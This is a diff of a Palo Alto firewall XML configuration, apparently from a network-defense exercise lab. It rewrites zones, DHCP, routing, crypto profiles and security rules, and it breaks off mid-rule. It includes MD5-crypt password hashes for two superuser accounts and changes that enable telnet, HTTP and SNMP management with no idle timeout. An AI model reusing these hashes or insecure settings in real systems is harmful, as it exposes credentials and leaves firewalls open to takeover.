@@ -1,9 +1,41 @@
 <?xml version="1.0"?>
-<config version="6.0.0" urldb="paloaltonetworks">
+<config version="8.0.0" urldb="paloaltonetworks">
   <mgt-config>
     <users>
       <entry name="admin">
-        <phash>$1$lemruyil$ciGhLnRsIyKS34H.f7/Jj0</phash>
+        <phash>$1$kcjevghg$b.OTn7tgkNEoOMBaqI.Uw.</phash>
+        <permissions>
+          <role-based>
+            <superuser>yes</superuser>
+          </role-based>
+        </permissions>
+        <preferences>
+          <saved-log-query>
+            <traffic>
+              <entry name="Traffic from Internal zone">
+                <query>(zone.src eq Internal)</query>
+              </entry>
+              <entry name="From Win8 to eComm">
+                <query>(addr.src in 172.20.242.100) and (addr.dst in 172.20.241.30)</query>
+              </entry>
+              <entry name="Traffic from 2008 AD">
+                <query>(addr.src in 172.20.242.200)</query>
+              </entry>
+              <entry name="All denied traffic">
+                <query>(action eq deny)</query>
+              </entry>
+              <entry name="Traffic from Splunk">
+                <query>(addr.src in 172.20.241.20)</query>
+              </entry>
+              <entry name="Traffic from Windows8.1">
+                <query>(addr.src in 172.20.242.100)</query>
+              </entry>
+            </traffic>
+          </saved-log-query>
+        </preferences>
+      </entry>
+      <entry name="administrator">
+        <phash>$1$fvlrcegi$Hl/otBYrhE2hbaWH2fNDE/</phash>
         <permissions>
           <role-based>
             <superuser>yes</superuser>
@@ -75,6 +107,296 @@
     <profiles>
       <decryption/>
     </profiles>
+    <admin-role>
+      <entry name="Honeypot">
+        <description>Honeypot for "admin" user scanning and n00b college kids.</description>
+        <role>
+          <device>
+            <webui>
+              <objects>
+                <address-groups>enable</address-groups>
+                <application-groups>enable</application-groups>
+                <application-filters>enable</application-filters>
+                <service-groups>enable</service-groups>
+                <global-protect>
+                  <hip-objects>enable</hip-objects>
+                  <hip-profiles>enable</hip-profiles>
+                </global-protect>
+                <custom-objects>
+                  <data-patterns>enable</data-patterns>
+                  <spyware>enable</spyware>
+                  <vulnerability>enable</vulnerability>
+                  <url-category>enable</url-category>
+                </custom-objects>
+                <security-profile-groups>enable</security-profile-groups>
+                <schedules>enable</schedules>
+              </objects>
+              <network>
+                <interfaces>enable</interfaces>
+                <virtual-wires>enable</virtual-wires>
+                <ipsec-tunnels>enable</ipsec-tunnels>
+                <dns-proxy>enable</dns-proxy>
+                <global-protect>
+                  <portals>enable</portals>
+                  <gateways>enable</gateways>
+                  <mdm>enable</mdm>
+                </global-protect>
+                <qos>enable</qos>
+              </network>
+              <device>
+                <config-audit>enable</config-audit>
+                <admin-roles>read-only</admin-roles>
+              </device>
+            </webui>
+            <xmlapi>
+              <report>enable</report>
+              <log>enable</log>
+              <config>enable</config>
+              <op>enable</op>
+              <commit>enable</commit>
+              <user-id>enable</user-id>
+              <export>enable</export>
+              <import>enable</import>
+            </xmlapi>
+          </device>
+        </role>
+      </entry>
+      <entry name="Configuration Admins">
+        <role>
+          <device>
+            <cli>superreader</cli>
+            <webui>
+              <acc>enable</acc>
+              <monitor>
+                <logs>
+                  <traffic>enable</traffic>
+                  <threat>enable</threat>
+                  <url>enable</url>
+                  <wildfire>enable</wildfire>
+                  <data-filtering>enable</data-filtering>
+                  <hipmatch>enable</hipmatch>
+                  <configuration>enable</configuration>
+                  <system>enable</system>
+                  <alarm>enable</alarm>
+                </logs>
+                <packet-capture>enable</packet-capture>
+                <app-scope>enable</app-scope>
+                <session-browser>enable</session-browser>
+                <botnet>enable</botnet>
+                <pdf-reports>
+                  <manage-pdf-summary>enable</manage-pdf-summary>
+                  <pdf-summary-reports>enable</pdf-summary-reports>
+                  <user-activity-report>enable</user-activity-report>
+                  <report-groups>enable</report-groups>
+                  <email-scheduler>enable</email-scheduler>
+                  <saas-application-usage-report>enable</saas-application-usage-report>
+                </pdf-reports>
+                <custom-reports>
+                  <application-statistics>enable</application-statistics>
+                  <data-filtering-log>enable</data-filtering-log>
+                  <threat-log>enable</threat-log>
+                  <threat-summary>enable</threat-summary>
+                  <traffic-log>enable</traffic-log>
+                  <traffic-summary>enable</traffic-summary>
+                  <url-log>enable</url-log>
+                  <hipmatch>enable</hipmatch>
+                </custom-reports>
+                <view-custom-reports>enable</view-custom-reports>
+                <application-reports>enable</application-reports>
+                <threat-reports>enable</threat-reports>
+                <url-filtering-reports>enable</url-filtering-reports>
+                <traffic-reports>enable</traffic-reports>
+              </monitor>
+              <objects>
+                <addresses>enable</addresses>
+                <address-groups>enable</address-groups>
+                <regions>enable</regions>
+                <applications>enable</applications>
+                <application-groups>enable</application-groups>
+                <application-filters>enable</application-filters>
+                <services>enable</services>
+                <service-groups>enable</service-groups>
+                <tags>enable</tags>
+                <global-protect>
+                  <hip-objects>enable</hip-objects>
+                  <hip-profiles>enable</hip-profiles>
+                </global-protect>
+                <dynamic-block-lists>enable</dynamic-block-lists>
+                <custom-objects>
+                  <data-patterns>enable</data-patterns>
+                  <spyware>enable</spyware>
+                  <vulnerability>enable</vulnerability>
+                  <url-category>enable</url-category>
+                </custom-objects>
+                <security-profiles>
+                  <antivirus>enable</antivirus>
+                  <anti-spyware>enable</anti-spyware>
+                  <vulnerability-protection>enable</vulnerability-protection>
+                  <url-filtering>enable</url-filtering>
+                  <file-blocking>enable</file-blocking>
+                  <data-filtering>enable</data-filtering>
+                  <dos-protection>enable</dos-protection>
+                </security-profiles>
+                <security-profile-groups>enable</security-profile-groups>
+                <log-forwarding>enable</log-forwarding>
+                <decryption-profile>enable</decryption-profile>
+                <schedules>enable</schedules>
+              </objects>
+              <network>
+                <interfaces>enable</interfaces>
+                <zones>enable</zones>
+                <vlans>enable</vlans>
+                <virtual-wires>enable</virtual-wires>
+                <virtual-routers>enable</virtual-routers>
+                <ipsec-tunnels>enable</ipsec-tunnels>
+                <dhcp>enable</dhcp>
+                <dns-proxy>enable</dns-proxy>
+                <global-protect>
+                  <portals>enable</portals>
+                  <gateways>enable</gateways>
+                  <mdm>enable</mdm>
+                </global-protect>
+                <qos>enable</qos>
+                <network-profiles>
+                  <ike-gateways>enable</ike-gateways>
+                  <ipsec-crypto>enable</ipsec-crypto>
+                  <ike-crypto>enable</ike-crypto>
+                  <tunnel-monitor>enable</tunnel-monitor>
+                  <interface-mgmt>enable</interface-mgmt>
+                  <zone-protection>enable</zone-protection>
+                  <qos-profile>enable</qos-profile>
+                </network-profiles>
+              </network>
+              <device>
+                <setup>
+                  <management>enable</management>
+                  <operations>enable</operations>
+                  <services>enable</services>
+                  <content-id>enable</content-id>
+                  <wildfire>enable</wildfire>
+                  <session>enable</session>
+                  <hsm>enable</hsm>
+                </setup>
+                <config-audit>enable</config-audit>
+                <admin-roles>read-only</admin-roles>
+                <user-identification>enable</user-identification>
+                <vm-info-source>enable</vm-info-source>
+                <high-availability>enable</high-availability>
+                <certificate-management>
+                  <certificates>enable</certificates>
+                  <certificate-profile>enable</certificate-profile>
+                  <ocsp-responder>enable</ocsp-responder>
+                </certificate-management>
+                <block-pages>enable</block-pages>
+                <log-settings>
+                  <system>enable</system>
+                  <config>enable</config>
+                  <hipmatch>enable</hipmatch>
+                  <cc-alarm>enable</cc-alarm>
+                  <manage-log>enable</manage-log>
+                </log-settings>
+                <server-profile>
+                  <snmp-trap>enable</snmp-trap>
+                  <syslog>enable</syslog>
+                  <email>enable</email>
+                  <netflow>enable</netflow>
+                  <radius>enable</radius>
+                  <ldap>enable</ldap>
+                  <kerberos>enable</kerberos>
+                </server-profile>
+                <local-user-database>
+                  <users>enable</users>
+                  <user-groups>enable</user-groups>
+                </local-user-database>
+                <authentication-profile>enable</authentication-profile>
+                <authentication-sequence>enable</authentication-sequence>
+                <access-domain>enable</access-domain>
+                <scheduled-log-export>enable</scheduled-log-export>
+                <software>read-only</software>
+                <global-protect-client>enable</global-protect-client>
+                <dynamic-updates>enable</dynamic-updates>
+                <licenses>enable</licenses>
+                <support>enable</support>
+                <master-key>enable</master-key>
+              </device>
+              <privacy>
+                <show-full-ip-addresses>enable</show-full-ip-addresses>
+                <show-user-names-in-logs-and-reports>enable</show-user-names-in-logs-and-reports>
+                <view-pcap-files>enable</view-pcap-files>
+              </privacy>
+              <commit>
+                <device>enable</device>
+                <commit-for-other-admins>enable</commit-for-other-admins>
+              </commit>
+              <global>
+                <system-alarms>enable</system-alarms>
+              </global>
+            </webui>
+            <xmlapi>
+              <report>enable</report>
+              <log>enable</log>
+              <config>enable</config>
+              <op>enable</op>
+              <commit>enable</commit>
+              <user-id>enable</user-id>
+              <export>enable</export>
+              <import>enable</import>
+            </xmlapi>
+          </device>
+        </role>
+        <description>Users with access to local device settings.</description>
+      </entry>
+      <entry name="Policy Admins">
+        <role>
+          <device>
+            <cli>deviceadmin</cli>
+            <webui>
+              <policies>
+                <security-rulebase>enable</security-rulebase>
+                <nat-rulebase>enable</nat-rulebase>
+                <qos-rulebase>enable</qos-rulebase>
+                <pbf-rulebase>enable</pbf-rulebase>
+                <ssl-decryption-rulebase>enable</ssl-decryption-rulebase>
+                <application-override-rulebase>enable</application-override-rulebase>
+                <authentication-rulebase>enable</authentication-rulebase>
+                <dos-rulebase>enable</dos-rulebase>
+              </policies>
+              <device>
+                <setup>
+                  <management>read-only</management>
+                  <operations>read-only</operations>
+                  <services>read-only</services>
+                  <content-id>read-only</content-id>
+                  <wildfire>read-only</wildfire>
+                  <session>read-only</session>
+                  <hsm>read-only</hsm>
+                </setup>
+                <config-audit>enable</config-audit>
+              </device>
+            </webui>
+            <xmlapi>
+              <report>enable</report>
+              <log>enable</log>
+              <config>enable</config>
+              <op>enable</op>
+              <commit>enable</commit>
+              <user-id>enable</user-id>
+              <export>enable</export>
+              <import>enable</import>
+            </xmlapi>
+          </device>
+        </role>
+        <description>Users with access to firewall policy rules.</description>
+      </entry>
+    </admin-role>
+    <ssl-tls-service-profile/>
+    <content-preview>
+      <application/>
+      <application-type>
+        <category/>
+        <technology/>
+      </application-type>
+    </content-preview>
   </shared>
   <devices>
     <entry name="localhost.localdomain">
@@ -85,7 +407,7 @@
               <link-speed>auto</link-speed>
               <link-duplex>auto</link-duplex>
               <link-state>auto</link-state>
-              <comment>LAN</comment>
+              <comment>PUBLIC</comment>
               <layer3>
                 <ipv6>
                   <neighbor-discovery>
@@ -121,7 +443,7 @@
               <link-speed>auto</link-speed>
               <link-duplex>auto</link-duplex>
               <link-state>auto</link-state>
-              <comment>DMZ</comment>
+              <comment>INTERNAL</comment>
               <layer3>
                 <ipv6>
                   <neighbor-discovery>
@@ -185,9 +507,31 @@
                 <untagged-sub-interface>no</untagged-sub-interface>
                 <interface-management-profile>Base</interface-management-profile>
                 <ip>
-                  <entry name="172.31.28.2/29"/>
+                  <entry name="172.31.27.2/29"/>
                 </ip>
+                <ndp-proxy>
+                  <enabled>no</enabled>
+                </ndp-proxy>
+                <lldp>
+                  <enable>no</enable>
+                </lldp>
               </layer3>
+            </entry>
+            <entry name="ethernet1/4">
+              <layer3>
+                <ipv6>
+                  <neighbor-discovery>
+                    <router-advertisement>
+                      <enable>no</enable>
+                    </router-advertisement>
+                  </neighbor-discovery>
+                </ipv6>
+                <ip>
+                  <entry name="172.20.242.254/24"/>
+                </ip>
+                <interface-management-profile>Base</interface-management-profile>
+              </layer3>
+              <comment>USER</comment>
             </entry>
           </ethernet>
         </interface>
@@ -282,6 +626,15 @@
                 <allow-redist-default-route>no</allow-redist-default-route>
                 <install-route>no</install-route>
               </bgp>
+              <rip>
+                <enable>no</enable>
+              </rip>
+              <ospf>
+                <enable>no</enable>
+              </ospf>
+              <ospfv3>
+                <enable>no</enable>
+              </ospfv3>
             </protocol>
             <admin-dists>
               <static>10</static>
@@ -295,21 +648,38 @@
               <member>ethernet1/1</member>
               <member>ethernet1/2</member>
               <member>ethernet1/3</member>
+              <member>ethernet1/4</member>
             </interface>
             <routing-table>
               <ip>
                 <static-route>
                   <entry name="default">
                     <nexthop>
-                      <ip-address>172.31.28.1</ip-address>
+                      <ip-address>172.31.27.1</ip-address>
                     </nexthop>
+                    <bfd>
+                      <profile>None</profile>
+                    </bfd>
+                    <path-monitor>
+                      <enable>no</enable>
+                      <failure-condition>any</failure-condition>
+                      <hold-time>2</hold-time>
+                    </path-monitor>
                     <interface>ethernet1/3</interface>
                     <metric>10</metric>
                     <destination>0.0.0.0/0</destination>
+                    <route-table>
+                      <unicast/>
+                    </route-table>
                   </entry>
                 </static-route>
               </ip>
             </routing-table>
+            <ecmp>
+              <algorithm>
+                <ip-modulo/>
+              </algorithm>
+            </ecmp>
           </entry>
         </virtual-router>
         <ike>
@@ -317,7 +687,7 @@
             <ike-crypto-profiles>
               <entry name="default">
                 <encryption>
-                  <member>aes128</member>
+                  <member>aes-128-cbc</member>
                   <member>3des</member>
                 </encryption>
                 <hash>
@@ -330,12 +700,40 @@
                   <hours>8</hours>
                 </lifetime>
               </entry>
+              <entry name="Suite-B-GCM-128">
+                <encryption>
+                  <member>aes-128-cbc</member>
+                </encryption>
+                <hash>
+                  <member>sha256</member>
+                </hash>
+                <dh-group>
+                  <member>group19</member>
+                </dh-group>
+                <lifetime>
+                  <hours>8</hours>
+                </lifetime>
+              </entry>
+              <entry name="Suite-B-GCM-256">
+                <encryption>
+                  <member>aes-256-cbc</member>
+                </encryption>
+                <hash>
+                  <member>sha384</member>
+                </hash>
+                <dh-group>
+                  <member>group20</member>
+                </dh-group>
+                <lifetime>
+                  <hours>8</hours>
+                </lifetime>
+              </entry>
             </ike-crypto-profiles>
             <ipsec-crypto-profiles>
               <entry name="default">
                 <esp>
                   <encryption>
-                    <member>aes128</member>
+                    <member>aes-128-cbc</member>
                     <member>3des</member>
                   </encryption>
                   <authentication>
@@ -347,7 +745,45 @@
                   <hours>1</hours>
                 </lifetime>
               </entry>
+              <entry name="Suite-B-GCM-128">
+                <esp>
+                  <encryption>
+                    <member>aes-128-gcm</member>
+                  </encryption>
+                  <authentication>
+                    <member>none</member>
+                  </authentication>
+                </esp>
+                <dh-group>group19</dh-group>
+                <lifetime>
+                  <hours>1</hours>
+                </lifetime>
+              </entry>
+              <entry name="Suite-B-GCM-256">
+                <esp>
+                  <encryption>
+                    <member>aes-256-gcm</member>
+                  </encryption>
+                  <authentication>
+                    <member>none</member>
+                  </authentication>
+                </esp>
+                <dh-group>group20</dh-group>
+                <lifetime>
+                  <hours>1</hours>
+                </lifetime>
+              </entry>
             </ipsec-crypto-profiles>
+            <global-protect-app-crypto-profiles>
+              <entry name="default">
+                <encryption>
+                  <member>aes-128-cbc</member>
+                </encryption>
+                <authentication>
+                  <member>sha1</member>
+                </authentication>
+              </entry>
+            </global-protect-app-crypto-profiles>
           </crypto-profiles>
           <gateway/>
         </ike>
@@ -357,26 +793,84 @@
         </tunnel>
         <dhcp>
           <interface>
+            <entry name="ethernet1/4">
+              <server>
+                <option>
+                  <lease>
+                    <timeout>1440</timeout>
+                  </lease>
+                  <gateway>172.20.242.254</gateway>
+                  <dns>
+                    <primary>172.20.241.27</primary>
+                    <secondary>172.20.240.23</secondary>
+                  </dns>
+                </option>
+                <ip-pool>
+                  <member>172.20.242.101-172.20.242.150</member>
+                </ip-pool>
+                <mode>enabled</mode>
+                <probe-ip>yes</probe-ip>
+              </server>
+            </entry>
             <entry name="ethernet1/1">
               <server>
                 <option>
                   <lease>
-                    <unlimited/>
+                    <timeout>1440</timeout>
                   </lease>
                   <gateway>172.20.241.254</gateway>
                 </option>
                 <ip-pool>
-                  <member>172.20.241.200-172.20.241.250</member>
+                  <member>172.20.241.101-172.20.241.150</member>
                 </ip-pool>
-                <mode>auto</mode>
+                <mode>enabled</mode>
+                <probe-ip>yes</probe-ip>
+              </server>
+            </entry>
+            <entry name="ethernet1/2">
+              <server>
+                <option>
+                  <lease>
+                    <timeout>1440</timeout>
+                  </lease>
+                  <gateway>172.20.240.254</gateway>
+                </option>
+                <ip-pool>
+                  <member>172.20.240.101-172.20.240.150</member>
+                </ip-pool>
+                <mode>enabled</mode>
+                <probe-ip>yes</probe-ip>
               </server>
             </entry>
           </interface>
         </dhcp>
+        <dns-proxy>
+          <entry name="mark">
+            <default>
+              <primary>8.8.8.8</primary>
+            </default>
+            <cache>
+              <enabled>yes</enabled>
+            </cache>
+            <tcp-queries>
+              <enabled>no</enabled>
+            </tcp-queries>
+            <domain-servers>
+              <entry name="changm3">
+                <domain-name>
+                  <member>www.blah.com</member>
+                </domain-name>
+                <cacheable>no</cacheable>
+                <primary>8.8.8.8</primary>
+              </entry>
+            </domain-servers>
+            <enabled>no</enabled>
+          </entry>
+        </dns-proxy>
       </network>
       <deviceconfig>
         <system>
-          <ip-address>172.20.241.100</ip-address>
+          <ip-address>172.20.242.150</ip-address>
           <netmask>255.255.255.0</netmask>
           <update-server>updates.paloaltonetworks.com</update-server>
           <update-schedule>
@@ -390,22 +884,24 @@
               </recurring>
             </threats>
           </update-schedule>
-          <timezone>US/Pacific</timezone>
+          <timezone>US/Central</timezone>
           <service>
-            <disable-telnet>yes</disable-telnet>
-            <disable-http>yes</disable-http>
+            <disable-telnet>no</disable-telnet>
+            <disable-http>no</disable-http>
+            <disable-snmp>no</disable-snmp>
           </service>
           <snmp-setting>
             <snmp-system/>
           </snmp-setting>
           <hostname>PA-VM</hostname>
-          <default-gateway>172.20.241.254</default-gateway>
+          <default-gateway>172.20.242.254</default-gateway>
           <dns-setting>
             <servers>
-              <primary>172.20.241.27</primary>
+              <primary>8.8.8.8</primary>
               <secondary>172.20.240.23</secondary>
             </servers>
           </dns-setting>
+          <server-verification>yes</server-verification>
         </system>
         <setting>
           <custom-logo>
@@ -1092,23 +1588,8 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
             <rematch>yes</rematch>
           </config>
           <management>
-            <disk-quota>
-              <traffic>32</traffic>
-              <threat>16</threat>
-              <config>4</config>
-              <system>4</system>
-              <alarm>3</alarm>
-              <appstat>6</appstat>
-              <trsum>7</trsum>
-              <thsum>2</thsum>
-              <hipmatch>3</hipmatch>
-              <dlp-logs>1</dlp-logs>
-              <application-pcaps>1</application-pcaps>
-              <threat-pcaps>1</threat-pcaps>
-              <debug-filter-pcaps>1</debug-filter-pcaps>
-              <hip-reports>1</hip-reports>
-              <iptag>1.00000</iptag>
-            </disk-quota>
+            <idle-timeout>0</idle-timeout>
+            <quota-settings/>
           </management>
         </setting>
       </deviceconfig>
@@ -1117,14 +1598,14 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
           <application/>
           <application-group/>
           <zone>
-            <entry name="LAN">
+            <entry name="Public">
               <network>
                 <layer3>
                   <member>ethernet1/1</member>
                 </layer3>
               </network>
             </entry>
-            <entry name="DMZ">
+            <entry name="Internal">
               <network>
                 <layer3>
                   <member>ethernet1/2</member>
@@ -1143,93 +1624,32 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                 <layer3/>
               </network>
             </entry>
+            <entry name="User">
+              <network>
+                <layer3>
+                  <member>ethernet1/4</member>
+                </layer3>
+              </network>
+            </entry>
           </zone>
-          <service>
-            <entry name="everything">
-              <protocol>
-                <tcp>
-                  <source-port>1-65535</source-port>
-                  <port>1-65535</port>
-                </tcp>
-              </protocol>
-              <description>everything</description>
-            </entry>
-            <entry name="DNS">
-              <protocol>
-                <udp>
-                  <port>53</port>
-                </udp>
-              </protocol>
-            </entry>
-            <entry name="HTTP-S">
-              <protocol>
-                <tcp>
-                  <port>80,443,8080</port>
-                </tcp>
-              </protocol>
-            </entry>
-            <entry name="MySQL">
-              <protocol>
-                <tcp>
-                  <port>3306</port>
-                </tcp>
-              </protocol>
-            </entry>
-          </service>
+          <service/>
           <service-group/>
           <schedule/>
           <rulebase>
             <security>
               <rules>
-                <entry name="LAN - External">
-                  <option>
-                    <disable-server-response-inspection>no</disable-server-response-inspection>
-                  </option>
-                  <from>
-                    <member>LAN</member>
-                  </from>
+                <entry name="Block PA External">
                   <to>
+                    <member>any</member>
+                  </to>
+                  <from>
                     <member>External</member>
-                  </to>
-                  <source>
-                    <member>any</member>
-                  </source>
-                  <destination>
-                    <member>any</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>any</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                  <log-start>yes</log-start>
-                  <log-end>yes</log-end>
-                  <negate-source>no</negate-source>
-                  <negate-destination>no</negate-destination>
-                </entry>
-                <entry name="DMZ - External">
-                  <from>
-                    <member>DMZ</member>
                   </from>
-                  <to>
-                    <member>External</member>
-                  </to>
                   <source>
                     <member>any</member>
                   </source>
                   <destination>
-                    <member>any</member>
+                    <member>Palo Alto External</member>
                   </destination>
                   <source-user>
                     <member>any</member>
@@ -1239,37 +1659,6 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                   </category>
                   <application>
                     <member>any</member>
-                  </application>
-                  <service>
-                    <member>any</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                  <log-start>yes</log-start>
-                </entry>
-                <entry name="any2any - PING">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>any</member>
-                  </source>
-                  <destination>
-                    <member>any</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>ping</member>
                   </application>
                   <service>
                     <member>application-default</member>
@@ -1277,312 +1666,7 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                   <hip-profiles>
                     <member>any</member>
                   </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="2012 - 2008-Ubuntu DNS">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>172.20.241.3</member>
-                  </source>
-                  <destination>
-                    <member>172.20.240.23</member>
-                    <member>172.20.241.27</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>DNS</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="2008 - 2008-Ubuntu DNS">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>172.20.241.27</member>
-                  </source>
-                  <destination>
-                    <member>172.20.240.23</member>
-                    <member>172.20.241.27</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>DNS</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="CentOS - 2008-Ubuntu DNS">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>172.20.240.11</member>
-                  </source>
-                  <destination>
-                    <member>172.20.240.23</member>
-                    <member>172.20.241.27</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>DNS</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="Debian - 2008-Ubuntu DNS">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>172.20.241.39</member>
-                  </source>
-                  <destination>
-                    <member>172.20.240.23</member>
-                    <member>172.20.241.27</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>DNS</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="Ubuntu - 2008-Ubuntu DNS">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>172.20.240.23</member>
-                  </source>
-                  <destination>
-                    <member>172.20.240.23</member>
-                    <member>172.20.241.27</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>DNS</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="2012 - Ubuntu MySQL">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>172.20.241.3</member>
-                  </source>
-                  <destination>
-                    <member>172.20.240.23</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>MySQL</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="CentOS - Ubuntu MySQL">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>172.20.240.11</member>
-                  </source>
-                  <destination>
-                    <member>172.20.240.23</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>MySQL</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="Debian - Ubuntu MySQL">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>172.20.241.39</member>
-                  </source>
-                  <destination>
-                    <member>172.20.240.23</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>MySQL</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="External - 2012 Webapp">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>any</member>
-                  </source>
-                  <destination>
-                    <member>172.25.28.3</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>HTTP-S</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
-                </entry>
-                <entry name="External - CentOS Web App">
-                  <from>
-                    <member>any</member>
-                  </from>
-                  <to>
-                    <member>any</member>
-                  </to>
-                  <source>
-                    <member>any</member>
-                  </source>
-                  <destination>
-                    <member>172.25.28.11</member>
-                  </destination>
-                  <source-user>
-                    <member>any</member>
-                  </source-user>
-                  <category>
-                    <member>any</member>
-                  </category>
-                  <application>
-                    <member>any</member>
-                  </application>
-                  <service>
-                    <member>HTTP-S</member>
-                  </service>
-                  <hip-profiles>
-                    <member>any</member>
-                  </hip-profiles>
-                  <action>allow</action>
+                  <action>deny</action>
                 </entry>
                 <entry name="any2any">
                   <option>
@@ -1615,20 +1699,453 @@ K3hWNASBk4UAUVw4iq5ystEtD0sLQUI3bu3qf//Z
                   <hip-profiles>
                     <member>any</member>
                   </hip-profiles>
+                  <action>allow</action>
+                  <log-start>no</log-start>
+                  <log-end>yes</log-end>
+                  <negate-source>no</negate-source>
+                  <negate-destination>no</negate-destination>
+                  <disabled>yes</disabled>
+                </entry>
+                <entry name="EXTERNAL2PUBLIC">
+                  <option>
+                    <disable-server-response-inspection>no</disable-server-response-inspection>
+                  </option>
+                  <from>
+                    <member>External</member>
+                  </from>
+                  <to>
+                    <member>Public</member>
+                  </to>
+                  <source>
+                    <member>any</member>
+                  </source>
+                  <destination>
+                    <member>any</member>
+                  </destination>
+                  <source-user>
+                    <member>any</member>
+                  </source-user>
+                  <category>
+                    <member>any</member>
+                  </category>
+                  <application>
+                    <member>any</member>
+                  </application>
+                  <service>
+                    <member>any</member>
+                  </service>
+                  <hip-profiles>
+                    <member>any</member>
+                  </hip-profiles>
+                  <action>allow</action>
+                  <log-start>no</log-start>
+                  <log-end>yes</log-end>
+                  <negate-source>no</negate-source>
+                  <negate-destination>no</negate-destination>
+                  <profile-setting>
+                    <profiles>
+                      <url-filtering>
+                        <member>default</member>
+                      </url-filtering>
+                      <file-blocking>
+                        <member>strict file blocking</member>
+                      </file-blocking>
+                      <virus>
+                        <member>default</member>
+                      </virus>
+                      <spyware>
+                        <member>strict</member>
+                      </spyware>
+                      <vulnerability>
+                        <member>default</member>
+                      </vulnerability>
+                      <wildfire-analysis>
+                        <member>default</member>
+                      </wildfire-analysis>
+                    </profiles>
+                  </profile-setting>
+                </entry>
+                <entry name="INTERNAL2PUBLIC">
+                  <option>
+                    <disable-server-response-inspection>no</disable-server-response-inspection>
+                  </option>
+                  <from>
+                    <member>Internal</member>
+                  </from>
+                  <to>
+                    <member>Public</member>
